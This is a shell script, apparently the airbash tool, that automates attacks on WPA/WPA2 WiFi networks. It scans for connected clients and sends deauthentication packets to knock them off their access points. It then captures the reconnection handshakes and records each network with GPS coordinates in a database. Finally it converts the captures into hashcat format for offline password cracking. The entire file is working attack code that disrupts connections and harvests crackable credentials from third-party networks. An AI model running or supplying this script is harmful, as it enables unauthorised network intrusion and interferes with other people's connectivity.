#!/system/bin/sh
# This is the airbash main script (https://github.com/tehw0lf/airbash)
# Written by tehw0lf
# This script is an automated WPA/WPA2 handshake collector which uses
# software from https://aircrack-ng.org. First, the script will scan for
# WiFi clients that are connected to access points. Then, each client receives
# a deauthentication packet that should terminate its connection to the
# access point, thus forcing a reconnect. In order to capture the handshake,
# airodump is being run after sending the deauthentication packet. Verification
# of a captured handshake is done using aircrack-ng
airocheck() {
	# checks a handshake (passed by file name) using aircrack-ng
	# returns 1 on success and 0 on failure
	for s in `ls "$1"*.cap 2>/dev/null`; do
		if [ `aircrack-ng -a 2 "$s" -w "$path$wl".c 2>/dev/null | grep -c valid` -eq 0 ]; then
			if [ `aircrack-ng -a 2 "$s" -w "$path$wl".c 2>/dev/null | awk '{print $NF}' | grep -c handshake` -ne 0 ]; then
				cs=1
			fi
		fi
	done
}
airekill() {
	# kill all instances of aireplay-ng to prevent locking
	for a in `pgrep aireplay-ng`; do
		kill -9 $a &>/dev/null
	done
}
airokill() {
	# kill all instances of airodump-ng to prevent locking
	for a in `pgrep airodump-ng`; do
		kill -9 $a &>/dev/null
	done
}

# configure path variables
path=/path/to/airbash-folder/
db=.db.sqlite3
bl=.bl
hs=.hs/
loc=.loc/
wl=.wl/

# configure temporary filenames
ofile=initlist
init=initlist-01.csv

# create nonexisting paths and files
mkdir "$path$hs" &>/dev/null
touch "$path$bl"
airokill

# clean up previous files (and .tar backups if present)
rm -f "$path"initlist &>/dev/null
rm -f "$path"*.csv &>/dev/null
rm -f "$path"*.cap &>/dev/null

# initial 20 second scan to determine targets
{ airodump-ng -w $path$ofile -o csv wlan0 &>/dev/null; } &
sleep 20
airokill
ctr=1
`cat $path$init 2>/dev/null | tr -d ' ' | awk '/Station/{y=1;next}y' | awk -F ',' '{print $6}' | grep -v [\(] | sort -u | sed '/^\s*$/d' > "$path"ninitfile`
ninit=`wc -l < "$path"ninitfile`
rm -f "$path"ninitfile
# level 1: access points (scan and apply filters)
for i in `cat $path$init 2>/dev/null | tr -d ' ' | awk '/Station/{y=1;next}y' | awk -F ',' '{print $6}' | grep -v [\(] | sort -u | sed '/^\s*$/d'`; do
	c=`cat $path$init 2>/dev/null | tr -d ' ' | grep $i | awk -F ',' 'NR==1{print $4}'`
	echo "_$ctr/$ninit    "
	{ airodump-ng -c $c --bssid $i -w $path$i -o pcap wlan0 &>/dev/null; } &
	sleep 2
	if [ `cat "$path$bl" 2>/dev/null | grep -c $i` -gt 0 ]; then
	# blacklisted access point
		echo "-         "
		airokill
		((ctr++))
		continue
	fi
	if [ `sqlite3 "$path$db" "SELECT * FROM hs WHERE bssid='$i'" 2>/dev/null | grep -c $i` -gt 0 ]; then
	# handshake for access point present in database
		echo "x         "
		airokill
		((ctr++))
		continue
	fi
	if [ `ls "$path$i"*.cap 2>/dev/null | grep -c cap` -eq 0 ]; then
	# access point is not reachable anymore
		echo "?         "
		airokill
		((ctr++))
		continue
	fi
	ctr2=1
	`cat $path$init 2>/dev/null | tr -d ' ' | awk '/Station/{y=1;next}y' | grep -v [\(] | sed '/^\s*$/d' | awk -F ',' '{print $1}' > "$path"nairofile`
	nairo=`wc -l < "$path"nairofile`
	rm -f "$path"nairofile
	# level 2: deauthenticate clients and try to capture handshake
	for j in `cat $path$init 2>/dev/null | tr -d ' ' | awk '/Station/{y=1;next}y' | grep -v [\(] | sed '/^\s*$/d' | awk -F ',' '{print $1}'`; do
		curbssid=`cat $path$init 2>/dev/null | tr -d ' ' | awk '/Station/{y=1;next}y' | grep -v [\(] | sed '/^\s*$/d' | grep $j | grep $i | awk -F ',' '{print $6}'`
		if [ "$curbssid" == "$i" ]; then
			echo "__$ctr2/$nairo    "
			# send a single deauth packet
			{ aireplay-ng -0 1 -a $i -c $j -F wlan0 &>/dev/null; } &
			sleep 5
			cs=0
			airocheck "$path$i"
			if [ $cs -eq 1 ]; then
				airekill
				break
			fi
			airekill
			((ctr2++))
		else
			((ctr2++))
		fi
	done
	sleep 5
	airokill
	((ctr++))
done
rm -f "$path"initlist*
ctr3=0
# finalize by inserting data for captured handshakes into database
# and converting the .pcap to a .hccapx file for use with hashcat
for h in `ls "$path"*.cap 2>/dev/null`; do
	if [ `aircrack-ng -a 2 "$h" -w "$path$wl".c 2>/dev/null | grep -c valid` -eq 0 ]; then
		airstr=`aircrack-ng -a 2 "$h" -w "$path$wl".c 2>/dev/null | grep handshake`
		getloc=`cat "$path$loc"*.txt 2>/dev/null | awk 'NR==0; END{print}'`
		if [ `echo "$airstr" | grep -c handshake` -eq 0 ]; then
			rm -f "$h"
		else
			b=`echo "$airstr" | awk '{print $2}'`
			e=`echo "$airstr" | awk '{for (F=3;F<=NF-3;++F) printf " %s" ($F)}'`
			e=${e:1:${#e}}
			lat=`echo "$getloc" | awk -F ',' '{print $2}'`
			lon=`echo "$getloc" | awk -F ',' '{print $3}'`
			sqlite3 "$path$db" "INSERT INTO hs(lat, lon, bssid, essid) VALUES('$lat', '$lon', '$b', '$e');" 2>/dev/null
			aircrack-ng "$h" -J "$h" &>/dev/null
			hc2hcx -o "$path$hs$b".hccapx "$h".hccap &>/dev/null
			mv "$h" "$path$hs"
			rm -f "$h".hccap
			((ctr3++))
		fi
	else
		rm -f "$h"
	fi
done
echo "_______"
echo "$ctr3!"